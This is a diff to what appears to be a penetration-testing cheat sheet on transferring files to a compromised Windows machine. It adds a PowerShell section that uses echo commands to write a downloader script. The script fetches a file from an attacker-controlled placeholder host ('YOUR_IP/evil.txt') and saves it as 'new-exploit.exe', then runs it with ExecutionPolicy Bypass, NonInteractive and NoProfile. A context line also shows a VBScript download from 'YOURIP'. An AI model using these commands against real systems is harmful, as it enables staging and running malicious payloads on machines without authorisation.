@@ -36,7 +36,16 @@ echo ts.Close >> wget.vbs
 
 > cscript wget.vbs http://YOURIP/file_to_send.txt C:\save\file\here.txt
 
+## Powershell
 
+```
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://YOUR_IP/evil.txt" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
+> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
 ## TFTP
 
